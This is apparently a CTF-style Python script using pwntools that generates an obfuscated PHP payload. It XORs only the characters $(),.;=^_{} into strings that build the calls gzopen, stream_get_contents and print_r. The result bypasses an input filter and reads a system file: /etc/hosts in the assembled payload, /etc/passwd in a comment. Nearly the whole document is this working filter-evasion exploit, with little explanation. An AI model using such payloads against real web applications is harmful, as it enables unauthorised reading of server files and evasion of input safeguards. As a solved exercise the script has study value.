from pwn import *
from sys import *

a = "$(),.;=^_{}"
kamus = dict()
for i in a:
	for j in a:
		for k in a:
			for l in a:
				kamus[xor(xor(xor(i, j), k), l)] = (i, j, k, l)


"""
$a = gzopen("/etc/passwd","r");
var_dump(stream_get_contents($a));
"""

pload = "gzopen"
kotak1 = """
$_='_}_}}_'^'=}=}}='^',^)^^('^')$$.;$';
"""
pload = "/etc/hosts"
kotak2 = """
$__='}}}}}__}}}'^'_}{}_==}{}'^')^^^).)_^_'^'$;,=$$$,,,';
"""

pload = "r"
kotak3 = """
$___='}'^'}'^'^'^',';
"""
pload = "print_r"

kotak4= """
$____='}}__}}}'^'}};={}}'^'^^)(^{^'^'.,$$,$,';
"""

pload = "stream_get_contents"
kotak5= """
$_____='}}}}_^}_}}}}__}}_}}'^'}{}};;}=}{}}=={}={}'^'_^^^,,{,^^{^)(^^(^_'^',,,;)$$);,$=$$,;$,,';
"""

kotak6 ="""
$____($_____($_($__,$___)));
"""

pload = "print_r"


hasil = kotak1 + kotak2 + kotak3 + kotak4 + kotak5 + kotak6

a = ""
b = ""
c = ""
d = ""
for i in pload:
	aa = kamus[i][0]
	bb = kamus[i][1]
	cc = kamus[i][2]
	dd = kamus[i][3]
	a += aa
	b += bb
	c += cc
	d += dd

# print ("$_='{}'^'{}'^'{}'^'{}';".format(a, b, c, d))
